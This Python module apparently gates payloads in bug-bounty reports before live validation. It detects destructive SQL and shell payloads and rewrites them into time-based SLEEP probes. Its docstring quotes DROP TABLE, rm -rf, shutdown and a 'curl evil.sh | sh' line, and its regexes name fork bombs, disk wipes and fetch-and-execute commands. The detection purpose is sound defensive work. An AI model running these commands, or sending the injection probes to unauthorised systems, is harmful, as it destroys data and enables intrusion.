"""
Payload safety gate for the H1 report validator.

The validator reproduces attacks against a LIVE target to confirm them. A
HackerOne report can contain a destructive payload — ``'; DROP TABLE users--``,
``; rm -rf /``, ``; shutdown -h now`` — and sending it verbatim to production to
"validate" would cause real damage. That violates the detection-only safety
policy the agents follow (no destructive payloads; detection only).

This module is the single place that decides, BEFORE anything is sent or
clicked, whether a payload is destructive and, if so, whether it can be
rewritten into a detection-equivalent variant that proves the same
vulnerability without the destructive effect:

  - SQLi ``'; DROP TABLE x--``      -> boolean/time-based probe (no write)
  - cmdi ``; rm -rf /``             -> ``; sleep 5`` time-based probe
  - cmdi ``; curl evil.sh | sh``    -> ``; sleep 5`` time-based probe

When a payload cannot be made safe with confidence, ``neutralize`` returns
``None`` and the caller must NOT send it — it routes the finding to manual
review instead. "Understand before acting": we read the payload and decide,
never spray.

The classifier is intentionally conservative on the destructive side (better to
route a borderline write to manual review than to execute it) and precise on the
neutralization side (only emit a safe variant we are confident preserves the
detection signal).
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional
from urllib.parse import unquote

from dast.utils.logger import get_logger

logger = get_logger(__name__)

# Bounded time-based delay used by neutralized probes. Matches the agent safety
# ceiling (SLEEP/WAITFOR max 5s) referenced in the project conventions.
_SAFE_DELAY_SECONDS = 5


# ── Destructive-pattern signatures ────────────────────────────────────────────
# Each entry is (compiled_regex, human_reason). Kept explicit and commented so a
# reviewer can audit exactly what is treated as destructive.

_SQL_WRITE_RE = re.compile(
    r'\b(drop\s+(table|database|schema|index|view)'      # DROP TABLE/DATABASE/...
    r'|truncate\s+table'                                  # TRUNCATE TABLE
    r'|delete\s+from'                                     # DELETE FROM
    r'|update\s+\w+\s+set'                                # UPDATE x SET
    r'|insert\s+into'                                     # INSERT INTO
    r'|alter\s+table'                                     # ALTER TABLE
    r'|grant\s+all'                                       # GRANT ALL
    r'|drop\s+user|create\s+user)\b',                     # user manipulation
    re.IGNORECASE,
)

# Destructive OS/command patterns (RCE / command injection).
_CMD_DESTRUCTIVE_RE = re.compile(
    r'(\brm\s+-[rf]'                                      # rm -rf / rm -f
    r'|\bmkfs\b'                                          # mkfs (format)
    r'|\bdd\s+if='                                        # dd (disk write)
    r'|\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b'     # host control
    r'|\b(format|del)\s+/[a-z]'                           # windows format/del
    r'|:\(\)\s*\{\s*:\|:'                                 # fork bomb :(){ :|:
    r'|>\s*/dev/sd'                                        # overwrite raw disk
    r'|\bchmod\s+-r?\s*000'                               # lock everything
    r'|\bmv\s+\S+\s+/dev/null)',                          # move to /dev/null
    re.IGNORECASE,
)

# Remote code fetch-and-execute (curl|sh, wget|bash, powershell IEX, etc.).
_REMOTE_EXEC_RE = re.compile(
    r'(curl\s+[^|]*\|\s*(sh|bash|zsh)'
    r'|wget\s+[^|]*\|\s*(sh|bash|zsh)'
    r'|iex\s*\(|invoke-expression'
    r'|python\s+-c\s|perl\s+-e\s'
    r'|bash\s+-c\s|;\s*eval\s)',
    re.IGNORECASE,
)


@dataclass
class SafetyVerdict:
    """Result of classifying a payload for destructive potential."""
    is_destructive: bool
    reason: str = ""
    # A detection-equivalent payload safe to send, or None when the payload
    # cannot be neutralized with confidence (caller must route to manual).
    safe_variant: Optional[str] = None


def _decode(text: str) -> str:
    """URL-decode (best effort) so encoded payloads are matched too."""
    if not text:
        return ""
    decoded = text
    # Decode twice to catch double-encoding, but stop if it stops changing.
    for _ in range(2):
        nxt = unquote(decoded)
        if nxt == decoded:
            break
        decoded = nxt
    return decoded


def classify(payload: str, vuln_type: str = "") -> SafetyVerdict:
    """
    Classify a payload (or a URL containing one) for destructive potential.

    Returns a SafetyVerdict. When destructive, ``safe_variant`` holds a
    detection-equivalent rewrite if one could be produced, else None.
    """
    haystack = _decode(payload or "")
    if not haystack.strip():
        return SafetyVerdict(is_destructive=False)

    if _SQL_WRITE_RE.search(haystack):
        reason = "SQL write/DDL statement (data-destructive)"
        return SafetyVerdict(True, reason, _neutralize_sqli(haystack))

    if _CMD_DESTRUCTIVE_RE.search(haystack):
        reason = "Destructive OS command"
        return SafetyVerdict(True, reason, _neutralize_cmd(haystack))

    if _REMOTE_EXEC_RE.search(haystack):
        reason = "Remote code fetch-and-execute"
        return SafetyVerdict(True, reason, _neutralize_cmd(haystack))

    return SafetyVerdict(is_destructive=False)


# ── Neutralization ────────────────────────────────────────────────────────────

def _neutralize_sqli(payload: str) -> Optional[str]:
    """
    Rewrite a destructive SQLi payload into a non-writing detection probe.

    We keep the injection prefix (the quote/paren break that escapes the query
    context) and replace the destructive statement with a boolean OR a
    time-based clause that proves injection without mutating data.

    Returns None if we cannot confidently isolate the injection prefix.
    """
    # Capture the part before the first statement separator or the destructive
    # keyword — that is the context-break the report already proved works.
    m = re.search(
        r"^(.*?)(;|\bdrop\b|\bdelete\b|\btruncate\b|\bupdate\b|\binsert\b|\balter\b|\bgrant\b|\bcreate\b)",
        payload, re.IGNORECASE | re.DOTALL,
    )
    prefix = m.group(1).strip() if m else ""
    # A boolean-based, side-effect-free confirmation. Time-based is the most
    # portable "did my injection execute" signal that writes nothing.
    #   <prefix> OR SLEEP(5)-- -
    # If we have no usable prefix, fall back to a bare time-based probe.
    if prefix:
        return f"{prefix} OR SLEEP({_SAFE_DELAY_SECONDS})-- -"
    return f"' OR SLEEP({_SAFE_DELAY_SECONDS})-- -"


def _neutralize_cmd(payload: str) -> Optional[str]:
    """
    Rewrite a destructive command-injection payload into a time-based probe.

    Preserve the injection separator the report used (``;``, ``|``, ``&&``,
    ``` ` ```, ``$(`` ) and replace the destructive command with a bounded
    ``sleep`` — a universally observable, side-effect-free signal.

    Returns None if no injection separator can be identified (we will not guess
    an execution context we do not understand).
    """
    sep_match = re.search(r'(\$\(|`|\|\||&&|;|\||&)', payload)
    if not sep_match:
        return None
    separator = sep_match.group(1)
    delay = _SAFE_DELAY_SECONDS
    if separator == "$(":
        return f"$(sleep {delay})"
    if separator == "`":
        return f"`sleep {delay}`"
    # ; | || && &  -> "<sep> sleep N"
    return f"{separator} sleep {delay}"


def make_safe(payload: str, vuln_type: str = "") -> SafetyVerdict:
    """
    Convenience wrapper: classify, and log the decision.

    Callers use the returned verdict:
      - not destructive            -> send the original payload
      - destructive + safe_variant -> send the safe variant
      - destructive + no variant   -> do NOT send; route to manual review
    """
    verdict = classify(payload, vuln_type)
    if verdict.is_destructive:
        if verdict.safe_variant:
            logger.warning(
                "Destructive payload neutralized for validation",
                reason=verdict.reason, vuln_type=vuln_type,
            )
        else:
            logger.warning(
                "Destructive payload could not be neutralized; blocking send",
                reason=verdict.reason, vuln_type=vuln_type,
            )
    return verdict
